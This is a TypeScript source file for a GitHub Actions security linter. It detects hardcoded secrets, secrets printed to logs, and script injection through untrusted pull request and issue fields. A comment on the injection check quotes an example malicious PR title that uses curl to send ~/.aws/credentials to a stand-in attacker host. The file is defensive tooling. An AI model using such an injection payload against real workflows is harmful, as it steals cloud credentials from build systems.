/**
 * GitHub Actions secrets exposure detector.
 *
 * Finds three classes of secret exposure problems in workflow files:
 *
 *   GHA-SEC-001: Hardcoded credentials/tokens in env blocks or step env vars
 *   GHA-SEC-002: Secrets printed to logs (echo ${{ secrets.X }})
 *   GHA-SEC-003: Script injection — untrusted user input used directly in
 *                `run:` commands without sanitization (e.g. ${{ github.event.pull_request.title }})
 *
 * References:
 *   https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
 *   https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
 */

import type { AuditFinding } from '../../types/index.js';
import type { GHAWorkflow, GHAJob, GHAStep } from '../../types/ast.js';
import { RULE_IDS, SECRET_KEY_PATTERNS, SECRET_VALUE_PATTERNS } from '../../constants/index.js';

// ---------------------------------------------------------------------------
// Patterns for script injection (untrusted inputs)
// ---------------------------------------------------------------------------

/**
 * GitHub Actions context expressions that are user-controlled and therefore
 * untrusted when embedded directly in `run:` commands.
 *
 * These values come from external actors (PR authors, issue commenters, etc.)
 * and can contain shell metacharacters that cause command injection.
 */
const UNTRUSTED_INPUT_PATTERNS: RegExp[] = [
  /\$\{\{\s*github\.event\.pull_request\.title\s*\}\}/,
  /\$\{\{\s*github\.event\.pull_request\.body\s*\}\}/,
  /\$\{\{\s*github\.event\.pull_request\.head\.ref\s*\}\}/,
  /\$\{\{\s*github\.event\.pull_request\.head\.label\s*\}\}/,
  /\$\{\{\s*github\.event\.issue\.title\s*\}\}/,
  /\$\{\{\s*github\.event\.issue\.body\s*\}\}/,
  /\$\{\{\s*github\.event\.comment\.body\s*\}\}/,
  /\$\{\{\s*github\.event\.review\.body\s*\}\}/,
  /\$\{\{\s*github\.event\.review_comment\.body\s*\}\}/,
  /\$\{\{\s*github\.head_ref\s*\}\}/,
  /\$\{\{\s*github\.event\.inputs\./,  // workflow_dispatch inputs are user-controlled
];

/**
 * Pattern that detects secrets being echoed/printed to logs.
 * Matches: echo ${{ secrets.X }}, print(${{ secrets.X }}), etc.
 */
const SECRET_ECHO_PATTERN =
  /\b(echo|print|printf|cat|write-host|log|console\.log|fmt\.Print)\b[^;]*\$\{\{\s*secrets\./i;

// ---------------------------------------------------------------------------
// DF-SEC-001 equivalent: Hardcoded secrets in env blocks
// ---------------------------------------------------------------------------

/**
 * Checks a key-value env map for hardcoded secrets.
 *
 * @param env     The env block object
 * @param context  Human-readable context for the finding (job name, step name)
 * @param line     Approximate line number
 */
function checkEnvForSecrets(
  env: Record<string, string>,
  context: string,
  line?: number,
): AuditFinding[] {
  const findings: AuditFinding[] = [];

  for (const [key, value] of Object.entries(env)) {
    // Skip if value references a secret properly (${{ secrets.X }})
    if (value.includes('${{ secrets.') || value.includes('${{secrets.')) continue;
    // Skip empty values and obvious placeholders
    if (!value || value.startsWith('${{') || value.startsWith('${')) continue;

    const keyIsSecret = SECRET_KEY_PATTERNS.some((p) => p.test(key));
    const valueIsSecret = SECRET_VALUE_PATTERNS.some((p) => p.test(value));

    if (keyIsSecret || valueIsSecret) {
      findings.push({
        id: RULE_IDS.GHA_SEC_001,
        title: `Hardcoded secret in env variable: ${key} (${context})`,
        description:
          `The environment variable "${key}" in ${context} appears to contain a hardcoded ` +
          'secret. Hardcoded credentials in workflow files are stored in plain text in the ' +
          'repository and visible to anyone with read access.',
        severity: 'critical',
        line,
        evidence: `${key}: ${value.length > 20 ? value.slice(0, 20) + '...' : value}`,
        fix:
          `Move the secret to GitHub Secrets (Settings → Secrets and variables → Actions)\n` +
          `Then reference it as: ${key}: \${{ secrets.${key.toUpperCase()} }}`,
        references: [
          'https://docs.github.com/en/actions/security-guides/encrypted-secrets',
        ],
      });
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// GHA-SEC-002: Secrets echoed to logs
// ---------------------------------------------------------------------------

/**
 * Checks a run step for secret values being printed to the log.
 *
 * GitHub Actions automatically redacts secret values in logs, but only if
 * the value is accessed via ${{ secrets.X }}. If a secret is first stored in
 * an env var and then echoed, the redaction may not work.
 */
function checkSecretEcho(step: GHAStep, jobId: string): AuditFinding | null {
  if (!step.run) return null;

  if (SECRET_ECHO_PATTERN.test(step.run)) {
    return {
      id: RULE_IDS.GHA_SEC_002,
      title: `Secret value may be printed to log in job "${jobId}"`,
      description:
        'A run step appears to print a secret value to the log. ' +
        'While GitHub Actions redacts secret values accessed via `${{ secrets.X }}`, ' +
        'the redaction is not guaranteed and should not be relied on. ' +
        'Printing secrets to logs can expose them in third-party integrations.',
      severity: 'high',
      line: step.line,
      evidence: step.run.split('\n').find((l) => SECRET_ECHO_PATTERN.test(l)),
      fix: 'Remove any echo/print statements that output secret values. Never log credentials.',
      references: [
        'https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-secrets',
      ],
    };
  }

  return null;
}

// ---------------------------------------------------------------------------
// GHA-SEC-003: Script injection via untrusted input
// ---------------------------------------------------------------------------

/**
 * Checks a run step for direct embedding of user-controlled GitHub context
 * values in shell commands.
 *
 * Example of VULNERABLE code:
 *   run: |
 *     echo "PR title: ${{ github.event.pull_request.title }}"
 *
 * An attacker can create a PR with title:
 *   `; curl https://evil.example.com/steal -d $(cat ~/.aws/credentials)`
 *
 * Safe alternative:
 *   env:
 *     TITLE: ${{ github.event.pull_request.title }}
 *   run: echo "PR title: $TITLE"
 */
function checkScriptInjection(step: GHAStep, jobId: string): AuditFinding | null {
  if (!step.run) return null;

  const matchedPattern = UNTRUSTED_INPUT_PATTERNS.find((pattern) =>
    pattern.test(step.run ?? ''),
  );

  if (!matchedPattern) return null;

  // Find the offending line for the evidence snippet
  const offendingLine = step.run
    .split('\n')
    .find((l) => matchedPattern.test(l));

  return {
    id: RULE_IDS.GHA_SEC_003,
    title: `Script injection risk via untrusted input in job "${jobId}"`,
    description:
      'A run step embeds user-controlled GitHub context data (from a PR, issue, or comment) ' +
      'directly into a shell command. An attacker can craft a PR title, issue body, or comment ' +
      'containing shell metacharacters to execute arbitrary commands in your workflow.',
    severity: 'critical',
    line: step.line,
    evidence: offendingLine?.trim(),
    fix:
      'Pass the untrusted value through an environment variable instead of interpolating it directly:\n\n' +
      '  env:\n' +
      '    PR_TITLE: ${{ github.event.pull_request.title }}\n' +
      '  run: echo "PR title: $PR_TITLE"  # Safe — shell does not interpret $PR_TITLE as code',
    references: [
      'https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections',
      'https://securitylab.github.com/research/github-actions-untrusted-input/',
    ],
  };
}

// ---------------------------------------------------------------------------
// Orchestrator for this file
// ---------------------------------------------------------------------------

/**
 * Processes one job's worth of steps for all secret exposure issues.
 */
function analyzeJobSecrets(job: GHAJob): AuditFinding[] {
  const findings: AuditFinding[] = [];

  // Check job-level env for hardcoded secrets
  if (job.env) {
    findings.push(...checkEnvForSecrets(job.env, `job "${job.id}"`, job.line));
  }

  // Check each step
  for (const step of job.steps) {
    const stepName = step.name ?? `step ${step.line ?? '?'}`;
    const context = `job "${job.id}" > step "${stepName}"`;

    // Step-level env secrets
    if (step.env) {
      findings.push(...checkEnvForSecrets(step.env, context, step.line));
    }

    // Secret echo check
    const echoFinding = checkSecretEcho(step, job.id);
    if (echoFinding) findings.push(echoFinding);

    // Script injection check
    const injectionFinding = checkScriptInjection(step, job.id);
    if (injectionFinding) findings.push(injectionFinding);
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Public analyzer entry point
// ---------------------------------------------------------------------------

/**
 * Analyzes a GitHub Actions workflow for secrets exposure issues.
 *
 * @param workflow  Parsed GHAWorkflow from parseGitHubActionsWorkflow()
 * @returns         Array of findings
 */
export function analyzeGHASecrets(workflow: GHAWorkflow): AuditFinding[] {
  const findings: AuditFinding[] = [];

  // Workflow-level env secrets
  if (workflow.env) {
    findings.push(...checkEnvForSecrets(workflow.env, 'workflow-level env'));
  }

  // Per-job analysis
  for (const job of workflow.jobs) {
    findings.push(...analyzeJobSecrets(job));
  }

  return findings;
}
